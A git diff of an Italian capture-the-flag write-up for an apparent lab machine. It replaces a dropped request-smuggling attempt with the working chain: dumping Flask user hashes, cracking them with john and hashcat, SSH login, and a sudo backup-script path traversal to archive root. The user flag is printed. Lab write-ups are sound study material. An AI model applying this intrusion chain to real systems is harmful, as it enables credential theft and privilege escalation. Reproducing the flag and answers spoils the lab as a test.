@@ -32,25 +32,132 @@ Nmap done: 1 IP address (1 host up) scanned in 31.97 seconds
 noto aperte le 2 porte 22 e 5000. cerco online cosa è Gunicorn
 
 
-## web app analisi
+##  Exploit
 
-analizzando la web app non si notano vulnerabilità lampanti (almeno ad occhio)
+Noto che viene usato il servizio Gunicorn 20.0.4 
 
-cercando online noto alcuni attacchi noti per Gunicorn 20.0.4 e provo a usare uno di quelli
+Provo a fuzzare un po' con il sito. immaginando ci sia flask, provo a farmi stampare gli utenti.
 
-POST /hello HTTP/1.1
-Host: 172.24.10.161
-Transfer-Encoding: chunked
-Content-Length: 90
-Transfer-Encoding: xchunked
-
-1
-a
-0
-
-GET /secret HTTP/1.1x
-Host: 172.24.10.161
-Content-Length: 0
+> print([(user.id, user.username, user.password) for user in User.query.all()])
+stampo gli utenti e le password.
 
 
-# SOLUZIONE NON TROVATA ANCORA
+
+
+## PASSWORD CRACKING
+### using john
+
+> development:759b74ce43947f5f4c91aeddc3e5bad3
+> martin:3de6f30c4a09c27fc71932bfc68474be
+
+> john --wordlist /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt --format=raw-md5 pass.txt 
+
+```
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Remaining 1 password hash
+Warning: no OpenMP support for this hash type, consider --fork=8
+Proceeding with wordlist:/usr/share/john/password.lst
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2025-05-17 14:14) 0g/s 59100p/s 59100c/s 59100C/s !@#$%..sss
+Session completed. 
+```
+
+### using hashcat
+
+hash.txt:
+> 759b74ce43947f5f4c91aeddc3e5bad3
+> 3de6f30c4a09c27fc71932bfc68474be
+ 
+
+> hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
+
+759b74ce43947f5f4c91aeddc3e5bad3:development              
+3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster     
+
+
+## SSH exploit
+
+
+> martin
+> nafeelswordsmaster
+
+vedo un file di backup e una cartella backups.
+
+scarico prima il backup poi esploro
+
+> python3 -m http.server 8080
+
+> wget 10.10.11.62:8080/code_home_.._root_2025_May.tar.bz2 -> file vuoto
+> 
+
+> wget 10.10.11.62:8080/backups/code_home_app-production_app_2024_August.tar.bz2
+>
+> tar -xjvf code_home_app-production_app_2024_August.tar.bz2 
+>
+è la home del sito, con tanto di codice
+
+non c'è nulla neanche nel db -> analizzo il resto.
+
+nella cartella /backups trovo task.json -> contiene delle cartelle che verranno backuppate.
+
+> sudo -l -> posso usare /usr/bin/backy.sh senza password -> esegue il backup della cartella specificata in task.json
+
+---
+
+Ipotizzo che user.txt sia in app-production dato che è un altro utente, e martin non ha la flag.
+
+modifico task.json per scaricare /home/app-production/user.txt nel backup, e poi lo scarico in locale:
+
+```json
+{
+        "destination": "/home/martin/backups/",
+        "multiprocessing": true,
+        "verbose_log": false,
+        "directories_to_archive": [
+                "/home/app-production/user.txt"
+        ],
+
+        "exclude": [
+                ".*"
+        ]
+}
+```
+> sudo /usr/bin/backy.sh task.json
+
+> wget 10.10.11.62:8080/code_home_app-production_2025_May.tar.bz2
+
+> tar -xjvf  code_home_app-production_2025_May.tar.bz2
+
+
+# USER FLAG
+
+2fad8d2c76c93fe868dd8c5630439ebd
+
+# PRIVESC
+
+uso lo stesso file per archiviare la cartella root
+
+
+```json
+{
+        "destination": "/home/martin/backups/",
+        "multiprocessing": true,
+        "verbose_log": false,
+        "directories_to_archive": [
+                "/home/../root"
+        ],
+
+        "exclude": [
+                ".*"
+        ]
+}
+```
+
+eseguo
+
+> sudo /usr/bin/backy.sh task.json
+
+> wget 10.10.11.62:8080/code_home_.._root_2025_May.tar.bz2
+
+> tar -xjvf code_home_.._root_2025_May.tar.bz2
